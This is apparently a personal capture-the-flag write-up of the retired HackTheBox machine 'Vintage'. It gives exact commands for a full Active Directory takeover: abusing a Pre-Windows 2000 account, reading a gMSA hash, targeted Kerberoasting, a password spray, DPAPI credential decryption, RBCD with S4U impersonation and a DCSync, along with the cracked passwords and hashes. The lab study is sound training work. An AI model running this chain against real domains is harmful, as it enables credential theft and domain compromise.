# VINTAGE — Hard

**Date Started:** June 18, 2026
**Date Completed:** June 18, 2026
**Difficulty:** Hard
**Platform:** HackTheBox (retired)
**Tags:** Active Directory, Kerberos-Only, Pre-Windows 2000, gMSA, DPAPI, RBCD, Targeted Kerberoasting, S4U
**Status:** COMPLETE

---

## Summary / Attack Chain

Kerberos-only environment (NTLM disabled). Exploited a Pre-Windows 2000 computer account (FS01$, password = lowercase hostname) to read a gMSA password hash, then leveraged group membership manipulation to enable a disabled service account and Kerberoast it. Password reuse gave a WinRM shell, where DPAPI credential recovery revealed an admin account. Used that account's GenericWrite on DelegatedAdmins to set up RBCD via S4U2Self + S4U2Proxy, then DCSync'd the domain.

```
P.Rosa (assume-breach) → BloodHound → FS01$ Pre-Windows 2000 (password: fs01)
  → bloodyAD get gMSA01$ msDS-ManagedPassword → NT hash
    → getTGT as gMSA01$ → add to ServiceManagers
      → remove ACCOUNTDISABLE from svc_sql → targetedKerberoast → hashcat -m 13100
        → svc_sql:Zer0the0ne → password spray → C.Neri reuses password
          → kinit + evil-winrm as C.Neri → user.txt
            → DPAPI: hidden credential blob + master key → dpapi.py → C.Neri_adm:Uncr4ck4bl3P4ssW0rd0312
              → getTGT as C.Neri_adm → add FS01$ to DelegatedAdmins (GenericWrite)
                → getST.py S4U2Self + S4U2Proxy as FS01$ → impersonate L.Bianchi_adm
                  → secretsdump DCSync → Administrator hash
                    → smbclient.py as L.Bianchi_adm → root.txt
```

**New techniques vs previous boxes:** Kerberos-only operations (every tool needs `-k`, `/etc/krb5.conf` required), Pre-Windows 2000 computer account exploitation, gMSA password reading, targeted Kerberoasting (enable disabled accounts first), DPAPI credential recovery (masterkey + credential blob + SID + password), RBCD via S4U2Self + S4U2Proxy, impersonating alternate DA when Administrator is network-logon-denied.

---

## Phase 1 — Setup + Enumeration

### Kerberos-only setup

NTLM is disabled on this box. Every tool needs Kerberos authentication (`-k` flags everywhere). Required setup:

```bash
echo "10.129.231.205 dc01.vintage.htb vintage.htb" | sudo tee -a /etc/hosts
```

`/etc/krb5.conf`:
```ini
[libdefaults]
    default_realm = VINTAGE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB
```

```bash
sudo systemctl stop systemd-timesyncd && sudo ntpdate 10.129.231.205
```

### Nmap

```bash
nmap -p- -Pn --min-rate 1000 -T4 10.129.231.205
```

DC fingerprint (53/88/389/636/3268/3269/445). No NTLM-dependent services exposed.

### BloodHound

```bash
bloodhound-python -d vintage.htb -u P.Rosa -p 'Rosaisbest123' -ns 10.129.231.205 -c all -k
```

Note: `bloodhound-python` (legacy) outputs individual JSON files, not a zip. Upload all JSONs to BloodHound CE.

**Key findings from BloodHound:**
- FS01$ is in the **Pre-Windows 2000 Compatible Access** group
- gMSA01$ has a readable `msDS-ManagedPassword` (by certain groups)
- gMSA01$ can add itself to **ServiceManagers** (AddSelf)
- ServiceManagers have **GenericAll** on service accounts (svc_sql, svc_ark, svc_ldap)
- C.Neri_adm has **GenericWrite** on **DelegatedAdmins** group
- DelegatedAdmins have **AllowedToAct** on DC01$ (RBCD)

---

## Phase 2 — Pre-Windows 2000 Computer Account

Pre-Windows 2000 computer accounts have a password equal to the lowercase hostname (without the `$`). These passwords are set at domain join and never rotated.

```bash
nxc smb dc01.vintage.htb -u 'fs01$' -p 'fs01' -k
```

Confirms valid authentication.

---

## Phase 3 — gMSA Password Reading

Group Managed Service Accounts store their password in the `msDS-ManagedPassword` attribute. The password is a 256-bit blob, not a human-readable string. bloodyAD extracts the NT hash directly.

```bash
bloodyAD -d vintage.htb -u 'fs01$' -p 'fs01' -k --host dc01.vintage.htb get object 'gMSA01$' --attr msDS-ManagedPassword
```

**gMSA01$ NT hash: `13277778844d7ff470fd39c065908bc2`**

### Get TGT as gMSA01$

```bash
getTGT.py vintage.htb/'gMSA01$' -hashes :13277778844d7ff470fd39c065908bc2 -dc-ip 10.129.231.205
export KRB5CCNAME=/home/andym/gMSA01\$.ccache
```

---

## Phase 4 — Group Manipulation + Targeted Kerberoasting

### Add gMSA01$ to ServiceManagers

```bash
bloodyAD -d vintage.htb -k --host dc01.vintage.htb add groupMember ServiceManagers 'gMSA01$'
```

**Critical:** Must get a fresh TGT after this. The old TGT doesn't contain the new group membership. Without refreshing, subsequent operations fail with `insufficientAccessRights`.

```bash
getTGT.py vintage.htb/'gMSA01$' -hashes :13277778844d7ff470fd39c065908bc2 -dc-ip 10.129.231.205
export KRB5CCNAME=/home/andym/gMSA01\$.ccache
```

### Enable disabled service account

svc_sql has `ACCOUNTDISABLE` set. Must remove it before Kerberoasting.

```bash
bloodyAD -d vintage.htb -k --host dc01.vintage.htb remove uac svc_sql -f ACCOUNTDISABLE
```

Note: bloodyAD's `-f` flag conflicts when using `-p hash -f rc4` auth. Workaround: use ccache-based auth (set `KRB5CCNAME`, use `-k` without `-p`).

### Targeted Kerberoast

```bash
targetedKerberoast.py -d vintage.htb --dc-ip 10.129.231.205 -k
```

Returns TGS-REP hashes for svc_sql, svc_ark, svc_ldap.

### Crack on Mac GPU

```bash
hashcat -m 13100 tgs_hashes.txt ~/wordlists/rockyou.txt
```

**svc_sql : Zer0the0ne**

---

## Phase 5 — Password Spray + WinRM Shell

```bash
nxc smb dc01.vintage.htb -u users.txt -p 'Zer0the0ne' -k --continue-on-success
```

**C.Neri reuses Zer0the0ne.**

### WinRM via Kerberos

`nxc winrm` only supports NTLM. For Kerberos WinRM, use `kinit` + `evil-winrm -r`:

```bash
kinit C.Neri@VINTAGE.HTB
evil-winrm -i dc01.vintage.htb -r VINTAGE.HTB
```

**User flag: `d0366ebc0fa5bb2cecc92bf224568d38`**

---

## Phase 6 — DPAPI Credential Recovery

### Find hidden credential files

`dir` without `-Force` hides credential blobs. Always use:

```powershell
cd C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
dir -Force
```

**Credential blob:** `C4BB96844A5C9DD45D5B6A9859252BA6`

```powershell
cd C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
dir -Force
```

**Master keys:** `4dbf04d8-529b-4b4c-b4ae-8e875e4fe847`, `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`

### Get SID

```powershell
whoami /user
```

**SID:** `S-1-5-21-4024337825-2033394866-2055507597-1115`

### Exfiltrate files

Evil-winrm `download` was broken (Ruby bug). Used PowerShell base64 encoding:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\to\file"))
```

Copy output, decode on attack host: `echo '<b64>' | base64 -d > file`

### Decrypt master key

The credential blob references one specific master key GUID. Try each until one works:

```bash
dpapi.py masterkey -file masterkey2 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password 'Zer0the0ne'
```

**Decrypted key:** `0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a`

### Decrypt credential blob

```bash
dpapi.py credential -file cred_blob -key 0xf8901b2125dd10209da9f66562df2e68...
```

**C.Neri_adm : Uncr4ck4bl3P4ssW0rd0312**

---

## Phase 7 — RBCD + S4U + DCSync

### Add FS01$ to DelegatedAdmins

C.Neri_adm has GenericWrite on DelegatedAdmins. DelegatedAdmins have AllowedToAct on DC01$ (RBCD).

```bash
getTGT.py vintage.htb/C.Neri_adm:'Uncr4ck4bl3P4ssW0rd0312' -dc-ip 10.129.231.205
export KRB5CCNAME=/home/andym/C.Neri_adm.ccache
bloodyAD -d vintage.htb -k --host dc01.vintage.htb add groupMember DelegatedAdmins 'fs01$'
```

### S4U2Self + S4U2Proxy

FS01$ is a computer account and has an SPN (required for S4U). Use it to request a service ticket impersonating a Domain Admin:

```bash
getTGT.py vintage.htb/'fs01$':fs01 -dc-ip 10.129.231.205
export KRB5CCNAME=/home/andym/fs01\$.ccache
getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'Administrator' 'vintage.htb/fs01$:fs01' -dc-ip dc01.vintage.htb -k
```

### DCSync

```bash
export KRB5CCNAME=/home/andym/dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
secretsdump.py -k -no-pass dc01.vintage.htb -just-dc-ntlm
```

**Administrator NT hash: `468c7497513f8243b59980f2240a10de`**

### Getting the flag

Administrator is denied network logon via Group Policy. Check for alternate Domain Admins:

```powershell
net group "Domain Admins" /domain
```

**L.Bianchi_adm** is also a DA. Impersonate them instead:

```bash
export KRB5CCNAME=/home/andym/fs01\$.ccache
getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'L.Bianchi_adm' 'vintage.htb/fs01$:fs01' -dc-ip dc01.vintage.htb -k
export KRB5CCNAME=/home/andym/L.Bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
smbclient.py -k -no-pass dc01.vintage.htb
```

```
use C$
cd Users\Administrator\Desktop
get root.txt
```

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | d0366ebc0fa5bb2cecc92bf224568d38 |
| root.txt | *(submitted)* |

---

## Mistakes / Tool Issues

Heavy infra and syntax assistance throughout. Attack path decisions were correct, but execution required significant help.

1. **bloodyAD `-f` flag conflict.** Using `-p '<hash>' -f rc4` conflicts with `remove uac -f ACCOUNTDISABLE` (both use `-f`). Workaround: ccache-based auth (`KRB5CCNAME` + `-k`).

2. **TGT not refreshed after group membership change.** After adding gMSA01$ to ServiceManagers, the old TGT didn't contain the new group. All subsequent operations failed with `insufficientAccessRights`. Must get a fresh TGT after any group change.

3. **nxc winrm doesn't support Kerberos.** Only NTLM. Needed `kinit` + `evil-winrm -r` instead.

4. **evil-winrm `download` broken.** Ruby error: `uninitialized constant WinRM::FS::FileManager::EstandardError`. Used PowerShell `[Convert]::ToBase64String()` instead.

5. **Base64 paste corruption.** Long base64 strings corrupted during terminal paste (line wrapping). Needed to pipe through SSH from Mac to avoid corruption.

6. **Wrong master key first try.** Credential blob references a specific master key GUID. First master key gave "Padding is incorrect." Second one worked.

7. **S4U impersonated dc01$ instead of Administrator.** dc01$ (machine account) doesn't have C$ access. Needed to impersonate a user account (Administrator) for file system access. DCSync worked with dc01$ because DRSUAPI doesn't require C$ access.

8. **Administrator denied network logon.** All remote tools (SMB, WMI, WinRM) failed with STATUS_LOGON_TYPE_NOT_GRANTED. Had to find alternate DA (L.Bianchi_adm) to access the file system.

9. **Evil-winrm GSSAPI broken with getTGT ccache.** `Invalid token was supplied` error when using getTGT.py-generated ccache. `kinit`-generated tickets work; getTGT.py ccache does not work with evil-winrm GSSAPI.

**Solo rating: 🟡 syntax refs + infra** — attack path decisions were all correct. Knew what to do at each step. Needed significant help with exact command syntax (dpapi.py, bloodyAD auth modes), tooling workarounds (evil-winrm bugs, base64 transfer), and troubleshooting (TGT refresh, S4U target selection, alternate DA).

---

## Lessons / Exam Relevance

- **Kerberos-only environments.** When NTLM is disabled, every tool needs `-k`, you need `/etc/krb5.conf` configured, and `getTGT.py` becomes your primary auth tool. TGT = single sign-on for the domain.
- **Pre-Windows 2000 computer accounts.** Password is the lowercase hostname (without `$`), set at domain join and never rotated. Check BloodHound for the "Pre-Windows 2000 Compatible Access" group.
- **gMSA password reading.** `msDS-ManagedPassword` contains a 256-bit password blob. bloodyAD extracts the NT hash directly. Can only be read by accounts/groups in `PrincipalsAllowedToRetrieveManagedPassword`.
- **TGT refresh after group changes.** Kerberos tickets encode group memberships at issuance time. After adding yourself to a group, the old TGT is stale. Must request a new one.
- **Targeted Kerberoasting.** If a service account is disabled, enable it first (`remove uac -f ACCOUNTDISABLE`), then Kerberoast normally. Requires GenericAll or equivalent on the account.
- **DPAPI credential recovery.** Three pieces needed: credential blob, master key file, and the user's SID + password. `dir -Force` reveals hidden files. Try both master keys if the first gives "Padding is incorrect."
- **RBCD requires an SPN.** S4U2Self + S4U2Proxy only work from accounts with Service Principal Names. Computer accounts have SPNs by default; user accounts don't. That's why FS01$ (computer) is the delegation source.
- **S4U impersonation target matters.** Impersonate a *user* (Administrator, another DA) for file system access. Impersonating machine accounts works for DRSUAPI/DCSync but not C$/ADMIN$ share access.
- **Administrator network logon restrictions.** Hardened environments may deny Administrator's network logon via GPO. Check `net group "Domain Admins" /domain` for alternate DAs.
- **evil-winrm GSSAPI compatibility.** `kinit`-generated tickets work with evil-winrm. `getTGT.py`-generated ccache files do not (GSSAPI token format mismatch). Always use `kinit` for evil-winrm Kerberos auth.

## Cleanup / Changes Made

- Added gMSA01$ to ServiceManagers group.
- Removed ACCOUNTDISABLE from svc_sql.
- Added FS01$ to DelegatedAdmins group.
- Requested service tickets impersonating Administrator and L.Bianchi_adm.
- DCSync'd all domain hashes.
